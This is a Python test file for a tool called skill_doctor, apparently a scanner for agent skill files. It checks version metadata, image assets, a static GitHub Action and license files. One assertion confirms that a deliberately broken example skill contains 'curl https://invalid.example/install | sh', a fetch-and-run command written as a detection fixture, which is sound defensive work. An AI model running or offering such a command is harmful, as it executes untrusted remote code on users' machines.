from __future__ import annotations

import struct
from pathlib import Path

from skill_doctor import __version__

ROOT = Path(__file__).parents[1]


def test_public_preview_metadata_and_example_are_consistent() -> None:
    pyproject = (ROOT / "pyproject.toml").read_text(encoding="utf-8")
    example = (ROOT / "examples" / "broken-skill" / "SKILL.md").read_text(encoding="utf-8")
    assert __version__ == "0.1.0a1"
    assert 'version = "0.1.0a1"' in pyproject
    assert "references/deployment-checklist.md" in example
    assert "curl https://invalid.example/install | sh" in example


def test_launch_images_have_expected_dimensions_and_small_social_payload() -> None:
    png_path = ROOT / "docs" / "assets" / "social-preview.png"
    png = png_path.read_bytes()
    assert png[:8] == b"\x89PNG\r\n\x1a\n"
    assert struct.unpack(">II", png[16:24]) == (1280, 640)
    assert png_path.stat().st_size < 1_000_000

    gif = (ROOT / "docs" / "assets" / "terminal-demo.gif").read_bytes()
    assert gif[:6] in {b"GIF87a", b"GIF89a"}
    assert struct.unpack("<HH", gif[6:10]) == (1100, 620)


def test_action_stays_static_and_exposes_sarif() -> None:
    action = (ROOT / "action.yml").read_text(encoding="utf-8")
    assert "skill-doctor check" in action
    assert "--dynamic" not in action
    assert "*.sarif.json" in action
    assert "fail-on-findings" in action


def test_public_community_surfaces_are_present() -> None:
    expected = (
        "CODE_OF_CONDUCT.md",
        "CONTRIBUTING.md",
        "SUPPORT.md",
        "CHANGELOG.md",
        ".github/ISSUE_TEMPLATE/bug.yml",
        ".github/ISSUE_TEMPLATE/feature.yml",
        ".github/DISCUSSION_TEMPLATE/design-partner.yml",
        "docs/DESIGN_PARTNERS.md",
        "docs/INTEGRATIONS.md",
        "docs/LAUNCH_KIT.md",
    )
    assert all((ROOT / path).is_file() for path in expected)


def test_standard_apache_license_text_is_present() -> None:
    license_text = (ROOT / "LICENSE").read_text(encoding="utf-8")
    assert "TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION" in license_text
    assert "END OF TERMS AND CONDITIONS" in license_text
    assert (ROOT / "NOTICE").is_file()
